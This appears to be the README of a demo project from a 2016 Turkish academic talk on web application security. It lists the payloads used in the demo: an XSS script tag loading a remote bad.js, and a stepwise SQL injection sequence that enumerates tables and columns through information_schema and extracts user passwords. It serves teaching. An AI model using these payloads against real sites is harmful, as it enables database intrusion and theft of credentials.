# ab16WebUygulamaGuvenligi
Akademik Bilişim 2016 kapsamındaki Web Uygulama Güvenliği sunumunda demo yaptığım sistem.


## Demoda Kullanılan Payloadlar

#### XSS

```sh
<script src='http://127.0.0.1/demo_xss_sql/hack/bad.js'></script>
``` 

#### Sql Injection
> ' or true # 

> ' and 1=1

> ' and 1=2

> ' order by 3

> -{id} union select 1,2,3

> -{id} union select 1,database(),3

> -{id} union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='bitcs'

> -{id} union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='bitcs' and table_name='users'

> -{id} union select 1,password,3 from users where id=1

> -{id} union select 1,password,3 from users where username='omercitak'